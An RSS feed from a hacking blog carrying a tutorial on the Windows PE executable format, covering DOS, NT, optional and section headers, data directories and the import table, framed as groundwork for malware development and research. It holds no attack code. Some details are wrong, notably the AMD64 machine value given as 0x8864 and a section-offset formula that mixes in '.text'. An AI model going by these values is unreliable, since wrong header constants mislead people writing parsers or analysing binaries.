<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>purpurina - a place for hacking</title>
    <link>http://localhost:1313/</link>
    <description>Recent content on purpurina - a place for hacking</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>made by jaco with love</copyright>
    <lastBuildDate>Thu, 27 Mar 2025 20:53:30 +0100</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.jpg</icon>
    
    
    <item>
      <title>PE parsing</title>
      <link>http://localhost:1313/posts/pe_parsing/</link>
      <pubDate>Thu, 27 Mar 2025 20:53:30 +0100</pubDate>
      
      <guid>http://localhost:1313/posts/pe_parsing/</guid>
      <description><![CDATA[<p>A random page with some information of the PE format file and its main headers.
Main usage: malware development and malware research.</p>
<h1 id="considerations">Considerations</h1>
<ul>
<li>RVA (<strong>Relative Virtual Address</strong>): Offset from Image Base. To obtain the absolute virtual address the calculation &ldquo;Image Base + RVA&rdquo; must be performed. Several PE sections include RVAs.</li>
<li>Check the <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a> if you want to know more! This is only a summary and my personal studies about the topic.</li>
</ul>
<h1 id="dos-header">DOS header</h1>
<ul>
<li><code>IMAGE_DOS_HEADER</code> structure definition from <code>winnt.h</code>.</li>
<li>First 64 bytes of the PE file.</li>
<li>Was very important in the MS-DOS era, right now it is not.</li>
<li>The actual Windows OS loader uses a field in this header to navigate to the <strong>new executable</strong> header , which is the header containing most of the needed information.</li>
<li>Kept in the binaries for compatibility purposes.</li>
</ul>
<p>We only want to know about the first and last members of this header:</p>
<ul>
<li><strong><code>e_magic</code>:</strong> First member of the DOS Header, it’s a WORD (2 bytes), and it&rsquo;s a called a magic number. It has a fixed value of <code>0x5A4D</code> or <code>MZ</code> in ASCII, and it serves as a signature that marks the file as an MS-DOS executable.</li>
<li><strong><code>e_lfanew</code>:</strong> This is the last member of the DOS header. This member is important to the PE loader on Windows systems because it tells the loader where to look for the <strong>new executable header</strong>. It is basically an &ldquo;offset&rdquo; pointer to the <strong>new executable header (from now on, called PE header).</strong></li>
</ul>
<p>This is what the old MS-DOS loader and the new Windows PE Loader do with this header:
<img src="/images/post_images/pe_parsing.png" alt=""></p>
<h1 id="dos-stub">DOS stub</h1>
<p>The DOS stub is a MS-DOS program that prints an error message saying that the executable is not compatible with DOS, and exists. This is not executed in the modern Windows OS. This is what gets executed when the program is loaded in MS-DOS.
If we copy the bytes of the DOS stub into IDA or any disassembler, we can see that the code routine is just to print the string and exit.</p>
<p><img src="/images/post_images/pe_parsing_1.png" alt=""></p>
<h1 id="nt-header-pe-headernew-executable-header">NT header (PE header/new executable header)</h1>
<p><code>IMAGE_NT_HEADERS</code>as defined in <code>winnt.h</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IMAGE_NT_HEADERS64</span> {
</span></span><span style="display:flex;"><span>    DWORD Signature;
</span></span><span style="display:flex;"><span>    IMAGE_FILE_HEADER FileHeader;
</span></span><span style="display:flex;"><span>    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
</span></span><span style="display:flex;"><span>} IMAGE_NT_HEADERS64, <span style="color:#f92672">*</span>PIMAGE_NT_HEADERS64;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IMAGE_NT_HEADERS</span> {
</span></span><span style="display:flex;"><span>    DWORD Signature;
</span></span><span style="display:flex;"><span>    IMAGE_FILE_HEADER FileHeader;
</span></span><span style="display:flex;"><span>    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
</span></span><span style="display:flex;"><span>} IMAGE_NT_HEADERS32, <span style="color:#f92672">*</span>PIMAGE_NT_HEADERS32;
</span></span></code></pre></div><p>There is one structure for 32-bit executables and other for 64-bit executables.
The optional header differs, as can be seen in the struct.</p>
<h2 id="signature">Signature</h2>
<p>Fixed value of <code>0x50450000</code> which translates to <code>PE\0\0</code> in ASCII. Again, another magic number inside the executable. This is used by the loader to know that it has reached the correct section after querying <strong><code>e_lfanew</code></strong> from the DOS header.</p>
<h2 id="file-header">File Header</h2>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">Check the official microsoft docs for this struct here</a>.
Another struct that contains information about the PE file. Some of this information is relevant. Let&rsquo;s see the struct:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IMAGE_FILE_HEADER</span> {
</span></span><span style="display:flex;"><span>    WORD    Machine;
</span></span><span style="display:flex;"><span>    WORD    NumberOfSections;
</span></span><span style="display:flex;"><span>    DWORD   TimeDateStamp;
</span></span><span style="display:flex;"><span>    DWORD   PointerToSymbolTable;
</span></span><span style="display:flex;"><span>    DWORD   NumberOfSymbols;
</span></span><span style="display:flex;"><span>    WORD    SizeOfOptionalHeader;
</span></span><span style="display:flex;"><span>    WORD    Characteristics;
</span></span><span style="display:flex;"><span>} IMAGE_FILE_HEADER, <span style="color:#f92672">*</span>PIMAGE_FILE_HEADER;
</span></span></code></pre></div><p>Details about the header:</p>
<ul>
<li><strong><code>Machine</code></strong>: Target architecture of the executable. Normally, these values <code>0x8864</code> for <code>AMD64</code> and <code>0x14c</code> for <code>i386</code> are the common ones. However, for a complete list of possible values you can check the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a>. However, this value is often ignored by the <strong><code>Magic</code></strong> value in the Optional Header (we will see it later).</li>
<li><strong><code>NumberOfSections</code></strong>: Number of sections that the binary has (.data is a section, for example).</li>
<li><strong><code>TimeDateStamp</code></strong>: The unix timestamp that indicates when the file was created.</li>
<li><strong><code>PointerToSymbolTable</code></strong>: The offset of the symbol table, in bytes, or zero if no COFF symbol table exists. Normally set to zero as the table does not get included by the compiler.</li>
<li><strong><code>NumberOfSymbols</code></strong>: Number of symbols in the COFF symbol table (normally 0).</li>
<li><strong><code>SizeOfOptionalHeader</code></strong>: The size of the optional header in bytes (we will see that header later).</li>
<li><strong><code>Characteristics</code>:</strong> A flag that indicates the attributes of the file, these attributes can be things like the file being executable, the file being a system file and not a user program, and a lot of other things. A complete list of these flags can be found on the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a>.</li>
</ul>
<h2 id="optional-header">Optional Header</h2>
<p>This can be very confusing, but this header, called the optional header, is one of the most important headers in the PE.
The PE loader looks for specific information from this header in order to load and run the executable.
<strong>It&rsquo;s called optional header as this header is not included in object files, but it is included in image files, as executables.</strong>
It doesn’t have a fixed size, that’s why the <code>IMAGE_FILE_HEADER.SizeOfOptionalHeader</code> member exists.</p>
<p>As mentioned earlier, there are two versions of the Optional Header, one for 32-bit executables and one for 64-bit executables.<br>
The two versions are different in two aspects:</p>
<ul>
<li><strong>The size of the structure itself (or the number of members defined within the structure):</strong> <code>IMAGE_OPTIONAL_HEADER32</code> has 31 members while <code>IMAGE_OPTIONAL_HEADER64</code> only has 30 members, that additional member in the 32-bit version is a DWORD named <code>BaseOfData</code> which holds an RVA of the beginning of the <code>data</code> section.</li>
<li><strong>The data type of some of the members:</strong> The following 5 members of the Optional Header structure are defined as <code>DWORD</code> in the 32-bit version and as <code>ULONGLONG</code> in the 64-bit version:
<ul>
<li><strong><code>ImageBase</code></strong></li>
<li><strong><code>SizeOfStackReserve</code></strong></li>
<li><strong><code>SizeOfStackCommit</code></strong></li>
<li><strong><code>SizeOfHeapReserve</code></strong></li>
<li><strong><code>SizeOfHeapCommit</code></strong></li>
</ul>
</li>
</ul>
<p>We will focus in the 64 bit struct, as most of the malware we will create and parse will be of this type:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IMAGE_OPTIONAL_HEADER64</span> {
</span></span><span style="display:flex;"><span>    WORD        Magic;
</span></span><span style="display:flex;"><span>    BYTE        MajorLinkerVersion;
</span></span><span style="display:flex;"><span>    BYTE        MinorLinkerVersion;
</span></span><span style="display:flex;"><span>    DWORD       SizeOfCode;
</span></span><span style="display:flex;"><span>    DWORD       SizeOfInitializedData;
</span></span><span style="display:flex;"><span>    DWORD       SizeOfUninitializedData;
</span></span><span style="display:flex;"><span>    DWORD       AddressOfEntryPoint;
</span></span><span style="display:flex;"><span>    DWORD       BaseOfCode;
</span></span><span style="display:flex;"><span>    ULONGLONG   ImageBase;
</span></span><span style="display:flex;"><span>    DWORD       SectionAlignment;
</span></span><span style="display:flex;"><span>    DWORD       FileAlignment;
</span></span><span style="display:flex;"><span>    WORD        MajorOperatingSystemVersion;
</span></span><span style="display:flex;"><span>    WORD        MinorOperatingSystemVersion;
</span></span><span style="display:flex;"><span>    WORD        MajorImageVersion;
</span></span><span style="display:flex;"><span>    WORD        MinorImageVersion;
</span></span><span style="display:flex;"><span>    WORD        MajorSubsystemVersion;
</span></span><span style="display:flex;"><span>    WORD        MinorSubsystemVersion;
</span></span><span style="display:flex;"><span>    DWORD       Win32VersionValue;
</span></span><span style="display:flex;"><span>    DWORD       SizeOfImage;
</span></span><span style="display:flex;"><span>    DWORD       SizeOfHeaders;
</span></span><span style="display:flex;"><span>    DWORD       CheckSum;
</span></span><span style="display:flex;"><span>    WORD        Subsystem;
</span></span><span style="display:flex;"><span>    WORD        DllCharacteristics;
</span></span><span style="display:flex;"><span>    ULONGLONG   SizeOfStackReserve;
</span></span><span style="display:flex;"><span>    ULONGLONG   SizeOfStackCommit;
</span></span><span style="display:flex;"><span>    ULONGLONG   SizeOfHeapReserve;
</span></span><span style="display:flex;"><span>    ULONGLONG   SizeOfHeapCommit;
</span></span><span style="display:flex;"><span>    DWORD       LoaderFlags;
</span></span><span style="display:flex;"><span>    DWORD       NumberOfRvaAndSizes;
</span></span><span style="display:flex;"><span>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
</span></span><span style="display:flex;"><span>} IMAGE_OPTIONAL_HEADER64, <span style="color:#f92672">*</span>PIMAGE_OPTIONAL_HEADER64;
</span></span></code></pre></div><p>Let&rsquo;s talk about the elements (<a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-image-only">information gathered from the Official Microsoft docs</a>):</p>
<ul>
<li>
<p><strong><code>Magic</code>:</strong> The optional header magic number determines whether an image is a PE32 or PE32+ executable. The value of this field is what determines whether the executable is 32-bit or 64-bit, <code>IMAGE_FILE_HEADER.Machine</code> is ignored by the Windows PE loader:</p>
<ul>
<li><strong><code>0x10B</code>:</strong> Identifies the image as a <code>PE32</code> executable.</li>
<li><strong><code>0x20B</code>:</strong> Identifies the image as a <code>PE32+</code> executable.</li>
<li><strong><code>0x107</code></strong>: Identifies it as a ROM image.</li>
</ul>
</li>
<li>
<p><strong><code>MajorLinkerVersion</code> and <code>MinorLinkerVersion</code>:</strong> The linker major and minor version numbers.</p>
</li>
<li>
<p><strong><code>SizeOfCode</code>:</strong> This field holds the size of the code (<code>.text</code>) section, or the sum of all code sections if there are multiple sections.</p>
</li>
<li>
<p><strong><code>SizeOfInitializedData</code>:</strong> This field holds the size of the initialized data (<code>.data</code>) section, or the sum of all initialized data sections if there are multiple sections.</p>
</li>
<li>
<p><strong><code>SizeOfUninitializedData</code>:</strong> This field holds the size of the uninitialized data (<code>.bss</code>) section, or the sum of all uninitialized data sections if there are multiple sections.</p>
</li>
<li>
<p><strong><code>AddressOfEntryPoint</code>:</strong> An RVA of the entry point when the file is loaded into memory. For program images, this is the starting address. For device drivers, this is the address of the initialization function. An entry point is optional for DLLs. When no entry point is present, this field must be zero.</p>
</li>
<li>
<p><strong><code>BaseOfCode</code>:</strong> An RVA of the start of the code section when the file is loaded into memory.</p>
</li>
<li>
<p><strong><code>ImageBase</code>:</strong> This field holds the preferred address of the first byte of image when loaded into memory (the preferred base address), this value must be a multiple of 64K.</p>
<ul>
<li>Due to memory protections like ASLR, and a lot of other reasons, <strong>the address specified by this field is almost never used</strong>. In such case, the PE loader chooses an unused memory range to load the image into, loads the image in such address, and  starts the <strong>relocation</strong> process.</li>
<li>In the <strong>relocation process</strong>, the OS fixes the constant addresses within the PE to work with the new image base.</li>
<li>There’s a special section that holds information about places that will need fixing if relocation is needed, that section is called the relocation section (<code>.reloc</code>).</li>
</ul>
</li>
<li>
<p><strong><code>SectionAlignment</code>:</strong> The alignment (in bytes) of sections when they are loaded into memory. It must be greater than or equal to FileAlignment. The default is the page size for the architecture.</p>
</li>
<li>
<p><strong><code>FileAlignment</code>:</strong> Similar to <code>SectionAligment</code> this field holds a value that gets used for section raw data alignment <strong>on disk</strong> (in bytes), if the size of the actual data in a section is less than the <code>FileAlignment</code> value, the rest of the chunk gets padded with zeroes to keep the alignment boundaries. The documentation states that this value should be a power of 2 between 512 and 64K, and if the value of <code>SectionAlignment</code> is less than the architecture’s page size then the sizes of <code>FileAlignment</code> and <code>SectionAlignment</code> must match.</p>
</li>
<li>
<p><strong><code>MajorOperatingSystemVersion</code>, <code>MinorOperatingSystemVersion</code>, <code>MajorImageVersion</code>, <code>MinorImageVersion</code>, <code>MajorSubsystemVersion</code> and <code>MinorSubsystemVersion</code>:</strong> These members of the structure specify the major version number of the required operating system, the minor version number of the required operating system, the major version number of the image, the minor version number of the image, the major version number of the subsystem and the minor version number of the subsystem respectively.</p>
</li>
<li>
<p><strong><code>Win32VersionValue</code>:</strong> A reserved field that the documentation says should be set to <code>0</code>.</p>
</li>
<li>
<p><strong><code>SizeOfImage:</code></strong> The size of the image file (in bytes), including all headers. It gets rounded up to a multiple of <code>SectionAlignment</code> because this value is used when loading the image into memory.</p>
</li>
<li>
<p><strong><code>SizeOfHeaders</code>:</strong> The combined size of the DOS stub, PE header (NT Headers), and section headers rounded up to a multiple of <code>FileAlignment</code>.</p>
</li>
<li>
<p><strong><code>CheckSum</code>:</strong> A checksum of the image file, it’s used to validate the image at load time.</p>
</li>
<li>
<p><strong><code>Subsystem</code>:</strong> This field specifies the Windows subsystem (if any) that is required to run the image, A complete list of the possible values of this field can be found on the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a>.</p>
</li>
<li>
<p><strong><code>DLLCharacteristics</code>:</strong> This field defines some characteristics of the executable image file, like if it’s <code>NX</code> compatible and if it can be relocated at run time.</p>
<ul>
<li>Although it is called <code>DLLCharacteristics</code>, it exists within normal executable image files and it defines characteristics that can apply to normal executable files. Don&rsquo;t get confused by the name. A complete list of the possible flags for <code>DLLCharacteristics</code> can be found on the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a>.</li>
</ul>
</li>
<li>
<p><strong><code>SizeOfStackReserve</code>, <code>SizeOfStackCommit</code>, <code>SizeOfHeapReserve</code> and <code>SizeOfHeapCommit</code>:</strong> These fields specify the size of the stack to reserve, the size of the stack to commit, the size of the local heap space to reserve and the size of the local heap space to commit respectively.</p>
</li>
<li>
<p><strong><code>LoaderFlags</code>:</strong> A reserved field that the documentation says should be set to <code>0</code>.</p>
</li>
<li>
<p><strong><code>NumberOfRvaAndSizes</code> :</strong> Size of the <code>DataDirectory</code> array.</p>
</li>
<li>
<p><strong><code>DataDirectory</code>:</strong> An array of <code>IMAGE_DATA_DIRECTORY</code> structures. This is the interesting section of the optional header.</p>
</li>
</ul>
<h3 id="data-directory">Data Directory</h3>
<p>The optional header field has an array of <code>IMAGE_DATA_DIRECTORY</code> called <code>DataDirectory</code>, with a maximum size of 16 entries (specifed by the constant <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>    ___IMAGE_DATA_DIRECTORY DataDirectory[___IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
</span></span></code></pre></div><p>An <code>IMAGE_DATA_DIRETORY</code> structure is defines as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IMAGE_DATA_DIRECTORY</span> {
</span></span><span style="display:flex;"><span>    DWORD   VirtualAddress;
</span></span><span style="display:flex;"><span>    DWORD   Size;
</span></span><span style="display:flex;"><span>} IMAGE_DATA_DIRECTORY, <span style="color:#f92672">*</span>PIMAGE_DATA_DIRECTORY;
</span></span></code></pre></div><p>It’s a very simple structure with only two members, first one being an RVA pointing to the start of that Data Directory and the second one being the size of that Data Directory.</p>
<p>But, what is a Data Directory?
A Data Directory is a piece of data located within one of the sections of the PE file.<br>
Data Directories contain useful information needed by the Windows loader.
An example of a very important directory is the <strong>Import Directory</strong>, a data directory that contains the list of external functions imported from other libraries.</p>
<p>Here’s a list of Data Directories defined in <code>winnt.h</code>. (Each one of these values represents an index in the DataDirectory array):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">// Directory Entries
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   </span><span style="color:#75715e">// Export Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   </span><span style="color:#75715e">// Import Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   </span><span style="color:#75715e">// Resource Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   </span><span style="color:#75715e">// Exception Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   </span><span style="color:#75715e">// Security Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   </span><span style="color:#75715e">// Base Relocation Table
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   </span><span style="color:#75715e">// Debug Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   </span><span style="color:#75715e">// Architecture Specific Data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   </span><span style="color:#75715e">// RVA of GP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_TLS             9   </span><span style="color:#75715e">// TLS Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   </span><span style="color:#75715e">// Load Configuration Directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   </span><span style="color:#75715e">// Bound Import Directory in headers
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_IAT            12   </span><span style="color:#75715e">// Import Address Table
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   </span><span style="color:#75715e">// Delay Load Import Descriptors
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   </span><span style="color:#75715e">// COM Runtime descriptor
</span></span></span></code></pre></div><p>So, for example, to access the Import Directory information we will have to:</p>
<ul>
<li>Parse the DOS header.</li>
<li>Get the e_lfanew variable of the DOS header to get the offset to the PE header.</li>
<li>Navigate to the optional header.</li>
<li>Get to the offset where the Data Directory array is.</li>
<li>Get the position 1 of such array.</li>
</ul>
<p>We will obtain a struct containing the RVA and the size of such Data Directory.
With that information, we can access such directory and parse it. <strong>Note that each directory will be parsed differently, depending on the information that it contains.</strong></p>
<p>Also note that there can be data directories with no information. If we take a look at the contents of <code>IMAGE_OPTIONAL_HEADER.DataDirectory</code> of an actual PE file, we might see entries where both fields are set to <code>0</code>:
<img src="/images/post_images/pe_parsing_2.png" alt=""></p>
<p><strong>Important: Data directories can be inside the sections (e.g, the Import Directory Table is usually inside the .idata or .rdata section)</strong>. So, we can say that after the NT header, there are the section headers.dI</p>
<h1 id="section-headers">Section headers</h1>
<p>After the PE header, the section headers are the following. They are the last headers in the PE.
A Section Header is a structure named <code>IMAGE_SECTION_HEADER</code> defined in <code>winnt.h</code> as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IMAGE_SECTION_HEADER</span> {
</span></span><span style="display:flex;"><span>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>            DWORD   PhysicalAddress;
</span></span><span style="display:flex;"><span>            DWORD   VirtualSize;
</span></span><span style="display:flex;"><span>    } Misc;
</span></span><span style="display:flex;"><span>    DWORD   VirtualAddress;
</span></span><span style="display:flex;"><span>    DWORD   SizeOfRawData;
</span></span><span style="display:flex;"><span>    DWORD   PointerToRawData;
</span></span><span style="display:flex;"><span>    DWORD   PointerToRelocations;
</span></span><span style="display:flex;"><span>    DWORD   PointerToLinenumbers;
</span></span><span style="display:flex;"><span>    WORD    NumberOfRelocations;
</span></span><span style="display:flex;"><span>    WORD    NumberOfLinenumbers;
</span></span><span style="display:flex;"><span>    DWORD   Characteristics;
</span></span><span style="display:flex;"><span>} IMAGE_SECTION_HEADER, <span style="color:#f92672">*</span>PIMAGE_SECTION_HEADER;
</span></span></code></pre></div><p>There will be one section header for each of the sections in the PE. Remember that we can retrieve the name of the sections:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[NT header][file header] number of sections: %u&#34;</span>, <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>PEFILE_NT_HEADERS.FileHeader.NumberOfSections);
</span></span></code></pre></div><p>These are the fields of a section header:</p>
<ul>
<li><strong><code>Name</code>:</strong>  A byte array of the size <code>IMAGE_SIZEOF_SHORT_NAME</code> that holds the name of the section.
<ul>
<li><code>IMAGE_SIZEOF_SHORT_NAME</code> has the value of <code>8</code> meaning that a section name can’t be longer than 8 characters.</li>
<li>For longer names the official documentation mentions a work-around by filling this field with an offset in the string table, <strong>however executable images do not use a string table so this limitation of 8 characters holds for executable images</strong>.</li>
</ul>
</li>
<li><strong><code>PhysicalAddress</code> or <code>VirtualSize</code>:</strong> A <code>union</code> variable defines multiple names for the same thing. This field contains the <strong>total size of the section when it’s loaded in memory</strong>.</li>
<li><strong><code>VirtualAddress</code>:</strong> The documentation states that for executable images this field holds the address of the first byte of the section relative to the image base when loaded in memory, and for object files it holds the address of the first byte of the section before relocation is applied.</li>
<li><strong><code>SizeOfRawData</code>:</strong> This field contains the size of the section on disk, it must be a multiple of <code>IMAGE_OPTIONAL_HEADER.FileAlignment</code>.  Note that this is the size ondisk, whereas <code>PhysicalAddress</code> or <code>VirtualSize</code> specifies the size once it&rsquo;s loaded in memory (the size can differ).</li>
<li><strong><code>PointerToRawData</code>:</strong> A pointer to the first page of the section within the file, for executable images it must be a multiple of <code>IMAGE_OPTIONAL_HEADER.FileAlignment</code>.</li>
<li><strong><code>PointerToRelocations</code>:</strong> A file pointer to the beginning of relocation entries for the section. It’s set to <code>0</code> for executable files.</li>
<li><strong><code>PointerToLineNumbers</code>:</strong> A file pointer to the beginning of COFF line-number entries for the section. It’s normally set to <code>0</code> because COFF debugging information is deprecated.</li>
<li><strong><code>NumberOfRelocations</code>:</strong> The number of relocation entries for the section, it’s normally set to <code>0</code> for executable images.</li>
<li><strong><code>NumberOfLinenumbers</code>:</strong> The number of COFF line-number entries for the section, it’s set to <code>0</code> because COFF debugging information is deprecated.</li>
<li><strong><code>Characteristics</code>:</strong> Flags that describe the characteristics of the section.
<ul>
<li>These characteristics are things like if the section contains executable code, contains initialized/uninitialized data, can be shared in memory.</li>
<li>A complete list of section characteristics flags can be found on the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a>.</li>
</ul>
</li>
</ul>
<h2 id="raw-data-can--virtual-size">Raw Data can != Virtual size</h2>
<p><code>SizeOfRawData</code> and <code>VirtualSize</code> can be different, and this can happen for multiple of reasons.</p>
<p><code>SizeOfRawData</code> (the size on disk) must be a multiple of <code>IMAGE_OPTIONAL_HEADER.FileAlignment</code>.
If the raw data size is less than that such value, the rest gets padded to match a multiple of the alignment.
However, when the section is loaded into memory it doesn’t follow that alignment and only the actual size of the section is occupied.  In this case <code>SizeOfRawData</code> will be greater than <code>VirtualSize</code>.</p>
<p><strong>The opposite can happen as well.</strong></p>
<p>If the section contains uninitialized data, these data won’t be accounted for on disk, but when the section gets mapped into memory, the section will expand to reserve memory space for when the uninitialized data gets later initialized and used.<br>
This means that the section on disk will occupy less than it will do in memory, in this case <code>VirtualSize</code> will be greater than <code>SizeOfRawData</code>.</p>
<h1 id="sections">Sections</h1>
<p>Lastly, the PE has the contents of the sections (.text, .data, .rdata).
Some sections have special names that indicate their purpose, we’ll go over some of them, and a full list of these names can be found on the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a> under the “Special Sections” section.</p>
<ul>
<li><strong><code>.text</code>:</strong> Contains the executable code of the program.</li>
<li><strong><code>.data</code>:</strong> Contains the initialized data.</li>
<li><strong><code>.bss</code>:</strong> Contains uninitialized data.</li>
<li><strong><code>.rdata</code>:</strong> Contains read-only initialized data.</li>
<li><strong><code>.edata</code>:</strong> Contains the export tables.</li>
<li><strong><code>.idata</code>:</strong> Contains the import tables.</li>
<li><strong><code>.reloc</code>:</strong> Contains image relocation information.</li>
<li><strong><code>.rsrc</code>:</strong> Contains resources used by the program, these include images, icons or even embedded binaries.</li>
<li><strong><code>.tls</code>:</strong> (<strong>T</strong>hread <strong>L</strong>ocal <strong>S</strong>torage), provides storage for every executing thread of the program.</li>
</ul>
<h1 id="import-table">Import table</h1>
<p>There is no rule that says that the import table must begin at the start of a section named <code>.idata</code>, but that’s how it is typically done, for reasons both traditional and practical.</p>
<p>The first field of the import table, VirtualAddress, is actually the RVA of the table. The RVA is the address of the table relative to the base address of the image when the table is loaded. The second field gives the size in bytes. The data directories, which form the last part of the optional header, are listed in the following table.</p>
<p>Note that the number of directories is not fixed. Before looking for a specific directory, check the NumberOfRvaAndSizes field in the optional header.</p>
<p>Also, do not assume that the RVAs in this table point to the beginning of a section or that the sections that contain specific tables have specific names.</p>
<p><img src="content/images/post_images/pe_parsing_3.png" alt=""></p>
<p><img src="content/images/post_images/pe_parsing_4.png" alt="">
If we navigate to the Section headers, we will see that the .rdata section will start before 2DC0C8:
<img src="content/images/post_images/pe_parsing_5.png" alt=""></p>
<p>But we can see that the import directory is not <strong>at the start of the section, but somewhere in the middle, as the .rdata section starts a bit before (0x26000) whereas the import directory starts at 0x2D0C8.</strong> The tool just says that the Import Directory is inside .rdata, but not at the start of it.</p>
<p>We need to translate the <code>Import Directory RVA</code> to the file offset - a place in the binary file where the DLL import information is stored. The way this can be achieved is by using the following formula:</p>
<p>Location of the Import Directory = imageBase + section.RawOffset + (importDirectory.RVA − section.VA)</p>
<p>Where:</p>
<ul>
<li><code>imageBase</code> is the start address of where the binary image is loaded</li>
<li><code>section.RawOffset</code> is the <code>Raw Address</code> value from the <code>.text</code> section</li>
<li><code>text.VA</code> is <code>Virtual Address</code> value from the <code>.text</code> section</li>
<li><code>importDirectory.RVA</code> is the <code>Import Directory RVA</code> value from <code>Data Directories</code> in <code>Optional Header</code>.</li>
